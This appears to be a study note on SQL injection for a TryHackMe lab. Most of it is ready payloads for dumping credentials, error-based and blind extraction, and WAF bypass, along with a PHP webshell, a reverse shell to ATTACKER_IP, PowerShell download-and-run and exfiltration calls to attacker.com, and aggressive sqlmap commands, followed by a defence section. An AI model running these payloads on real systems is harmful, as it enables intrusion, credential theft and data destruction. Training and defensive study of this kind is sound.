# 04 – SQL Injection (SQLi)

> **OWASP Top 10 2025 — A05: Injection**
> Lab Platform: TryHackMe

---

## Table of Contents

1. [Overview](#overview)
2. [How It Works](#how-it-works)
3. [Types of SQL Injection](#types-of-sql-injection)
4. [Impact by Type](#impact-by-type)
5. [Attack Techniques](#attack-techniques)
6. [WAF Bypass Techniques](#waf-bypass-techniques)
7. [Affected Databases](#affected-databases)
8. [Tools](#tools)
9. [Defence & Mitigation](#defence--mitigation)
10. [Lab Setup](#lab-setup)
11. [Study Path](#study-path)

---

## Overview

SQL Injection is a code injection attack where **attacker-controlled input is interpreted as SQL commands** by the database engine. It is one of the oldest and most critical web vulnerabilities, consistently appearing in the OWASP Top 10 since its inception.

```
User Input  →  Application  →  SQL Query  →  Database
                                    ↑
                          Attacker manipulates here
```

**Root Cause:** Concatenating user input directly into SQL queries without validation or parameterization.

---

## How It Works

### Vulnerable Code Example

```php
// VULNERABLE — input concatenated directly
$query = "SELECT * FROM users WHERE username='" . $_POST['user'] . "'";
```

### Normal Request

```
Input:  alice
Query:  SELECT * FROM users WHERE username='alice'
Result: Returns alice's record ✓
```

### Injected Request

```
Input:  ' OR '1'='1
Query:  SELECT * FROM users WHERE username='' OR '1'='1'
Result: Returns ALL records — authentication bypassed ✗
```

---

## Types of SQL Injection

### 1. In-Band SQLi

Response is directly visible in the application.

#### Error-Based

Triggers database errors that **reveal schema information** in the error message.

```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --
```

- Best for: quick fingerprinting and initial enumeration
- Works when: verbose error messages are shown to the user

#### UNION-Based

Appends a second SELECT statement to **retrieve data from other tables**.

```sql
' UNION SELECT username, password, NULL FROM users --
```

- Best for: extracting large amounts of data quickly
- Requires: correct column count and matching data types

---

### 2. Blind SQLi

No data is directly returned — attacker infers information from app behavior.

#### Boolean-Based

Asks the database a **true/false question** and observes page response.

```sql
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' --
```

- True condition → page loads normally
- False condition → page changes, errors, or shows empty content
- Slow: extracts one character at a time

#### Time-Based

Uses **deliberate delays** to infer true/false when page response looks identical.

```sql
' AND IF(1=1, SLEEP(5), 0) --   → 5 second delay = TRUE
```

- Works even when no visual difference exists
- Most reliable for completely blind scenarios

---

### 3. Out-of-Band SQLi (OOB)

Data is **exfiltrated through a separate channel** (DNS/HTTP) to an attacker-controlled server.

```sql
'; EXEC master..xp_dirtree '\\attacker.com\share' --  (MSSQL)
```

- Used when in-band channels are completely blocked
- Requires outbound DNS/HTTP from the server

---

### 4. Second-Order SQLi (Stored)

Payload is **stored safely**, then executed when retrieved and used in another query later.

```
Step 1 — Store:  Register with username: admin'--
Step 2 — Trigger: Password change query uses stored username unsafely
Result: Another user's record is modified
```

- Hardest to detect — input validation passes at entry point
- Common in: profile updates, password reset flows

---

### 5. Stacked Queries

Terminates the original query with `;` and **injects an entirely new query**.

```sql
'; DROP TABLE users; --
'; INSERT INTO admins VALUES ('hacker','hacked'); --
'; EXEC xp_cmdshell('whoami'); --
```

- Supported by: MSSQL, PostgreSQL
- Not supported by: MySQL via default PHP `mysql_query()`

---

## Impact by Type

| Type             | Data Leak | Auth Bypass | Data Modify | RCE | Severity |
| ---------------- | :-------: | :---------: | :---------: | :-: | -------- |
| Error-Based      |     ✓     |      —      |      —      |  —  | High     |
| UNION-Based      |    ✓✓     |      —      |      —      |  —  | Critical |
| Boolean Blind    |     ✓     |      —      |      —      |  —  | High     |
| Time-Based Blind |     ✓     |      —      |      —      |  —  | High     |
| Auth Bypass      |     —     |     ✓✓      |      —      |  —  | Critical |
| Stacked Queries  |     ✓     |      ✓      |     ✓✓      |  ✓  | Critical |
| Out-of-Band      |     ✓     |      —      |      —      |  —  | Critical |
| Second-Order     |     ✓     |      ✓      |     ✓✓      |  —  | Critical |
| File Read/Write  |    ✓✓     |      —      |      —      | ✓✓  | Critical |

**Real-world impact:**

- Full database dump (usernames, passwords, PII, card data)
- Authentication bypass without knowing credentials
- Account takeover and privilege escalation
- Remote code execution via `xp_cmdshell` or file write
- Complete server compromise
- Regulatory violations (GDPR, PCI-DSS)

---

## Attack Techniques

### Step 1 — Detect Injection Point

```
'          → syntax error = injectable
''         → no error = quotes are being escaped
1'         → error in numeric param
1 AND 1=1  → true condition
1 AND 1=2  → false condition (page changes)
```

### Step 2 — Identify Column Count (UNION)

```sql
' ORDER BY 1--   → no error
' ORDER BY 2--   → no error
' ORDER BY 3--   → ERROR = 2 columns exist
```

### Step 3 — Find Visible Columns

```sql
' UNION SELECT NULL, NULL--
' UNION SELECT 'a', NULL--    → 'a' appears in page = col 1 is visible
```

### Step 4 — Extract Data

```sql
' UNION SELECT username, password FROM users--
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

### Authentication Bypass

```sql
' OR '1'='1' --
admin'--
' OR 1=1 LIMIT 1--
') OR ('1'='1
```

### Read System Files (MySQL)

```sql
' UNION SELECT LOAD_FILE('/etc/passwd'), NULL--
```

### Write Webshell (MySQL)

```sql
' UNION SELECT '<?php system($_GET["cmd"]); ?>', NULL
  INTO OUTFILE '/var/www/html/shell.php'--
```

### OS Command Execution (MSSQL)

```sql
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
'; EXEC xp_cmdshell 'whoami';--
```

---

## Exploitation: All of This (Practical Guide)

### 1. Error-Based SQLi Exploitation

#### Detect Error-Based Vulnerability

```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --
' AND UpdateXML(1, CONCAT(0x7e, (SELECT user())), 1) --
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), 0x7e, database(), 0x7e, user(), 0x7e, @@version_comment) x FROM information_schema.tables GROUP BY x) a) --
```

#### Extract Data via Error Messages

```sql
-- Get current database name
' AND EXTRACTVALUE(1, CONCAT(0x7e, database())) --

-- Get current user
' AND EXTRACTVALUE(1, CONCAT(0x7e, user())) --

-- Get version
' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version)) --

-- Enumerate tables
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))) --

-- Enumerate columns
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'))) --

-- Extract username & password
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(CONCAT(username, ':', password)) FROM users))) --
```

#### Impact

✓ Fast enumeration
✓ Works when database returns errors to user
✓ Can extract multiple rows with GROUP_CONCAT

---

### 2. Union-Based SQLi Exploitation

#### Step 1: Determine Number of Columns

**Rule 1:** All queries combined using UNION must have an **equal number of expressions** in their target lists.

```sql
' ORDER BY 1--    → no error
' ORDER BY 2--    → no error
' ORDER BY 3--    → no error
' ORDER BY 4--    → ERROR ✗

Result: Vulnerable query has 3 columns
```

**Alternative using UNION NULL method:**

```sql
' UNION SELECT NULL--           → ERROR
' UNION SELECT NULL, NULL--     → ERROR
' UNION SELECT NULL, NULL, NULL--  → SUCCESS ✓

Result: 3 columns confirmed
```

#### Step 2: Identify Data Types (Find String Columns)

**Rule 2:** The **data types must be compatible** between queries.

**Method 1 - Probe Each Column with String Values:**

```sql
' UNION SELECT 'a', NULL, NULL--
Result: Conversion error on col 2 & 3 (integer type)
        → Column 1 is STRING ✓

' UNION SELECT NULL, 'a', NULL--
Result: Conversion error / ERROR
        → Column 2 is NOT STRING ✗

' UNION SELECT NULL, NULL, 'a'--
Result: SUCCESS / Value appears
        → Column 3 is STRING ✓

Columns accepting strings: 1, 3
```

**Method 2 - Use Numbers as Test Values:**

```sql
' UNION SELECT 1, 2, 3--
' UNION SELECT 'a', 'b', 'c'--

Which ones still work? Those columns accept any type.
```

#### Step 3: Extract Database Information

Once you know the number of columns and which ones are visible:

```sql
-- Get database name
' UNION SELECT database(), NULL, NULL--

-- Get current user
' UNION SELECT user(), NULL, NULL--

-- Get MySQL version
' UNION SELECT @@version, NULL, NULL--
```

#### Step 4: Enumerate Database Structure

```sql
-- List all databases
' UNION SELECT GROUP_CONCAT(schema_name), NULL, NULL FROM information_schema.schemata--

-- List all tables in current database
' UNION SELECT GROUP_CONCAT(table_name), NULL, NULL FROM information_schema.tables WHERE table_schema=database()--

-- List all tables in specific database
' UNION SELECT GROUP_CONCAT(table_name), NULL, NULL FROM information_schema.tables WHERE table_schema='mysql'--

-- List columns in specific table
' UNION SELECT GROUP_CONCAT(column_name), NULL, NULL FROM information_schema.columns WHERE table_name='users'--
```

#### Step 5: Extract Sensitive Data

```sql
-- Extract all usernames and passwords
' UNION SELECT GROUP_CONCAT(CONCAT(id, ':', username, ':', password)), NULL, NULL FROM users--

-- Extract with custom separator for readability
' UNION SELECT GROUP_CONCAT(CONCAT(username, ' | ', password) SEPARATOR '\n'), NULL, NULL FROM users--

-- Extract from admin table
' UNION SELECT GROUP_CONCAT(CONCAT(admin_username, ':', admin_password)), NULL, NULL FROM admin_users--

-- Extract specific number of rows
' UNION SELECT GROUP_CONCAT(username LIMIT 10), NULL, NULL FROM users--
```

#### Step 6: Read Files (MySQL with FILE privileges)

```sql
-- Read /etc/passwd
' UNION SELECT LOAD_FILE('/etc/passwd'), NULL, NULL--

-- Read configuration files
' UNION SELECT LOAD_FILE('/var/www/html/config.php'), NULL, NULL--

-- Read source code
' UNION SELECT LOAD_FILE('/var/www/html/index.php'), NULL, NULL--
```

#### Step 7: Write Files (MySQL with FILE privileges)

```sql
-- Write webshell
' UNION SELECT '<?php system($_GET["cmd"]); ?>', NULL, NULL INTO OUTFILE '/var/www/html/shell.php'--

-- Write reverse shell
' UNION SELECT '<?php exec("/bin/bash -c /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"); ?>', NULL, NULL INTO OUTFILE '/var/www/html/rev.php'--
```

#### Step 8: Bypass Authentication

```sql
-- Login bypass (if login has 2 columns)
' UNION SELECT 'admin', '1', NULL--

-- Username/password retrieval
' UNION SELECT username, password, NULL FROM users LIMIT 1--
```

#### Practical UNION-Based Example

```
Original Query: SELECT id, name, email FROM products WHERE id=1

1. Find column count: ' ORDER BY 3-- (3 columns exist)

2. Test data types: ' UNION SELECT 'a', 'b', 'c'-- (all string)

3. Get database name:
   ' UNION SELECT database(), user(), @@version--
   Result: myapp_db | root@localhost | 5.7.31

4. Extract users table:
   ' UNION SELECT username, password, email FROM users--

5. Result displayed:
   admin | admin123 | admin@company.com
   john  | pass123  | john@company.com
```

#### Impact

✓ Fastest method for data extraction
✓ Works even if no errors shown
✓ Can dump entire database
✓ Limited only by column count/types

---

### 3. Boolean-Based Blind SQLi Exploitation

No data returned directly — infer information from **true/false responses**.

#### Detect Blind SQLi

```sql
?id=1 AND 1=1        → Normal page ✓
?id=1 AND 1=2        → Page changed/empty ✓

If both return same visual response → likely time-based, not boolean
```

#### Extract Database Name Character by Character

```sql
?id=1 AND SUBSTRING(database(),1,1)='m'   → TRUE (page loads)
?id=1 AND SUBSTRING(database(),1,1)='x'   → FALSE (empty/error)
?id=1 AND SUBSTRING(database(),2,1)='y'   → TRUE
...
Result: Database is "my..."
```

#### Extract Table Names

```sql
?id=1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND SUBSTRING(table_name,1,1)='u')=1

If TRUE → First table starts with 'u' (likely "users")
If FALSE → Try another letter
```

#### Extract Column Names

```sql
?id=1 AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND SUBSTRING(column_name,1,1)='u')>0

Continue with each character...
```

#### Extract Data Values

```sql
?id=1 AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'
?id=1 AND SUBSTRING((SELECT password FROM users LIMIT 1),2,1)='b'
...
Reconstruct: password = "ab..."
```

#### Optimize with Binary Search

```sql
-- ASCII of first password char > 100?
?id=1 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100 → TRUE

-- ASCII > 110?
?id=1 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>110 → FALSE

-- ASCII > 105?
?id=1 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>105 → TRUE

Result: Character is between 106-110 (narrow down with fewer queries)
```

#### Impact

✗ Very slow (character by character)
✓ Works when data not returned
✓ Works when page response differs

---

### 4. Time-Based Blind SQLi Exploitation

When **page looks identical** regardless of true/false condition.

#### Detect Time-Based Blind

```sql
?id=1                    → Normal response (fast)
?id=1 AND SLEEP(5)       → Delayed response (5 seconds)

If delayed → Time-based SQLi confirmed ✓
```

#### Extract Data with Sleep Delays

```sql
-- If condition TRUE, sleep 5 seconds
?id=1 AND IF(1=1, SLEEP(5), 0)           → 5 sec delay (TRUE)
?id=1 AND IF(1=2, SLEEP(5), 0)           → Normal (FALSE)

-- Extract character by character
?id=1 AND IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)
  → If delayed 5 sec → 'm' is correct
  → If normal → try next letter

-- Extract with ASCII comparison (binary search)
?id=1 AND IF(ASCII(SUBSTRING(database(),1,1))>100, SLEEP(5), 0)
  → If delayed → ASCII > 100
  → Use binary search to narrow down
```

#### Extract Passwords

```sql
?id=1 AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0)
?id=1 AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),2,1)='b', SLEEP(5), 0)
...
```

#### Practical Example

```
Extracting admin password:

?id=1 AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)
  → Delayed 5 sec → First char is 'a' ✓

?id=1 AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),2,1)='d', SLEEP(5), 0)
  → Delayed 5 sec → Second char is 'd' ✓

?id=1 AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),3,1)='m', SLEEP(5), 0)
  → Delayed 5 sec → Third char is 'm' ✓

Password so far: "adm..."
```

#### Impact

✗ Extremely slow (seconds per character)
✓ Works when no visual/error difference
✓ Most reliable for completely blind cases

---

### 5. Out-of-Band (OOB) SQLi Exploitation

Exfiltrate data via **DNS or HTTP** to attacker-controlled server.

#### DNS Exfiltration (MSSQL)

```sql
-- Setup: Attacker controls dns.attacker.com
-- Setup: ns1.attacker.com → attacker's server

'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
'; EXEC sp_configure 'Ole Automation Objects',1; RECONFIGURE;--
'; DECLARE @r varchar(max); SET @r = (SELECT password FROM users WHERE id=1);
   EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths', @r OUTPUT;--
```

#### DNS Exfiltration (MySQL with UDF)

```sql
-- If DNS exfiltration UDF installed:
' UNION SELECT dns_exfil(CONCAT((SELECT password FROM users LIMIT 1), '.attacker.com')), NULL, NULL--

-- Attacker checks DNS query logs:
-- Log shows: admin123.attacker.com
```

#### HTTP Exfiltration (MSSQL)

```sql
'; DECLARE @data varchar(max) = (SELECT password FROM users);
   EXEC master..xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://attacker.com/?data=' + @data + '"';--
```

#### Impact

✓ Works when in-band channels blocked
✓ Can exfiltrate large amounts of data
✓ Requires outbound network access

---

### 6. Authentication Bypass (Special Case)

#### Bypass Login Without Credentials

```sql
-- Standard bypass
Username: ' OR '1'='1
Password: anything

-- Query becomes: SELECT * FROM users WHERE username='' OR '1'='1' AND password='anything'
-- Returns any user (usually first one)
```

#### Bypass with LIMIT

```sql
Username: admin'--
Password: (leave empty)

-- Query becomes: SELECT * FROM users WHERE username='admin'--' AND password=''
-- Comment removes password check
```

#### Bypass Login Check

```sql
Username: ' UNION SELECT 'admin', 'password', NULL--
Password: anything

-- If application checks: if(user_exists) then login
-- Injected query returns admin user, authentication succeeds
```

---

### 7. Stacked Queries (Execute Multiple Queries)

Only works on **MSSQL, PostgreSQL, Oracle** (not MySQL by default).

#### Delete Data

```sql
'; DROP TABLE users; --
'; DELETE FROM users WHERE id=1; --
```

#### Modify Data

```sql
'; UPDATE users SET password='hacked' WHERE username='admin'; --
'; INSERT INTO admin_users VALUES ('hacker', 'password123'); --
```

#### Execute System Commands (MSSQL)

```sql
'; EXEC xp_cmdshell 'whoami'; --
'; EXEC xp_cmdshell 'ipconfig'; --
'; EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://attacker.com/shell.ps1 -OutFile C:\shell.ps1; C:\shell.ps1"'; --
```

#### Get Reverse Shell (MSSQL)

```sql
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
'; EXEC xp_cmdshell 'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/shell.ps1'')"'; --
```

---

### Summary Table: Which Technique to Use

| Scenario                        | Best Technique        | Speed        | Complexity |
| ------------------------------- | --------------------- | ------------ | ---------- |
| Data visible on page            | **UNION-Based**       | ⚡⚡⚡ Fast  | Low        |
| Page differs on true/false      | **Boolean Blind**     | ⚡ Slow      | Medium     |
| No visual difference            | **Time-Based Blind**  | 🐢 Very Slow | Medium     |
| Error messages shown            | **Error-Based**       | ⚡⚡ Fast    | Low        |
| Completely blocked channels     | **Out-of-Band**       | ⚡⚡ Fast    | High       |
| Need to modify data/drop tables | **Stacked Queries**   | ⚡⚡ Fast    | High       |
| Bypass authentication           | **Auth Bypass/UNION** | ⚡⚡⚡ Fast  | Low        |

---

## WAF Bypass Techniques

### Comment Injection

```sql
UN/**/ION SEL/**/ECT
UN--\nION SELECT
```

### Case Variation

```sql
uNiOn SeLeCt
SeLeCt * FrOm users
```

### Whitespace Alternatives

```sql
UNION%09SELECT    (tab)
UNION%0ASELECT    (newline)
SELECT(col)FROM(table)
```

### Encoding

```sql
%27           → ' (URL encode)
%2527         → ' (double URL encode)
0x61646d696e  → admin (hex)
CHAR(97,100,109,105,110) → admin
```

### Keyword Doubling

```sql
UNUNIONION SELSELECTECT   (if WAF strips keyword once)
```

### Scientific Notation

```sql
1e0UNION1e0SELECT...
```

### HPP (HTTP Parameter Pollution)

```
?id=1&id=2 UNION SELECT...
```

---

## Affected Databases

| Database   | Comment Syntax | Sleep Function              | Version Query                  | String Concat |
| ---------- | -------------- | --------------------------- | ------------------------------ | ------------- | --- | --- |
| MySQL      | `--` or `#`    | `SLEEP(n)`                  | `@@version`                    | `CONCAT(a,b)` |
| MSSQL      | `--`           | `WAITFOR DELAY '0:0:n'`     | `@@version`                    | `a+b`         |
| PostgreSQL | `--`           | `pg_sleep(n)`               | `version()`                    | `a            |     | b`  |
| Oracle     | `--`           | `DBMS_PIPE.RECEIVE_MESSAGE` | `SELECT banner FROM v$version` | `a            |     | b`  |
| SQLite     | `--`           | —                           | `sqlite_version()`             | `a            |     | b`  |

---

## Tools

### sqlmap

Industry-standard automated SQLi scanner and exploiter.

```bash
# Basic detection
sqlmap -u "http://target.com/page?id=1"

# POST form
sqlmap -u "http://target.com/login" --data="user=a&pass=b"

# Authenticated (with cookie)
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# Dump entire database
sqlmap -u "http://target.com/page?id=1" --dump-all

# Dump specific table
sqlmap -u "http://target.com/page?id=1" -D mydb -T users --dump

# Get OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# Bypass WAF with tamper scripts
sqlmap -u "http://target.com/page?id=1" \
  --tamper=space2comment,randomcase,between

# From Burp Suite saved request
sqlmap -r burp_request.txt -p vulnerable_param

# Maximum aggression
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3
```

### Burp Suite

- Intercept requests and manually test injection points
- Use Intruder for automated payload fuzzing
- Use Repeater for manual query testing

### Manual Testing

- Always test manually first — understand what's happening before automating

---

## Defence & Mitigation

### Primary — Parameterized Queries (Prepared Statements)

The **only reliable defence**. Separates SQL code from user data at the protocol level.

```python
# Python — SECURE
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

```java
// Java — SECURE
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ?");
ps.setString(1, username);
```

```php
// PHP PDO — SECURE
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute([':id' => $id]);
```

```csharp
// C# — SECURE
cmd.CommandText = "SELECT * FROM users WHERE id = @id";
cmd.Parameters.AddWithValue("@id", userId);
```

---

### Secondary Defences

| Defence                  | How                                              | Why                          |
| ------------------------ | ------------------------------------------------ | ---------------------------- |
| **Least Privilege**      | DB user = SELECT only, no FILE/DROP/EXEC         | Limits blast radius          |
| **Input Validation**     | Whitelist types — integers, emails, etc.         | Reduces attack surface       |
| **Error Handling**       | Custom error pages, never expose DB errors       | Prevents information leakage |
| **WAF**                  | Deploy mod_security or cloud WAF rules           | Catches known payloads       |
| **ORM**                  | Use SQLAlchemy, Hibernate, ActiveRecord          | Parameterizes by default     |
| **Stored Procedures**    | Pre-compiled procedures (if written safely)      | Reduces dynamic SQL          |
| **Network Segmentation** | DB not accessible from internet                  | Limits OOB exfiltration      |
| **Monitoring & Logging** | Alert on `UNION`, `SLEEP`, `xp_cmdshell` in logs | Detect attacks in progress   |

---

## Lab Setup

```bash
# 1. Add target to hosts file
echo "TARGET_IP sqli.thm" | sudo tee -a /etc/hosts

# 2. Open in browser
http://sqli.thm

# 3. Start Burp Suite — set browser proxy to 127.0.0.1:8080

# 4. Test manually first
# → Find input fields, URL params, cookies
# → Try: '  "  '-- '# ' OR 1=1--

# 5. Run sqlmap on confirmed injection point
sqlmap -u "http://sqli.thm/page?id=1" --dbs
```

---

## Study Path

```
✅ SSRF
↓
→ SQL Injection (you are here)
  ↓ Types: Error → UNION → Blind Boolean → Blind Time → OOB → Stacked
  ↓ Tools: Manual → Burp → sqlmap
  ↓ Defence: Prepared Statements
↓
→ XSS (Cross-Site Scripting)
↓
→ OS Command Injection
↓
→ Authentication Bypass
↓
→ File Upload Vulnerabilities
```

---

_Reference: OWASP Top 10 2025 A05 | PortSwigger Web Security Academy | HackTricks SQLi | TryHackMe SQLi Module_
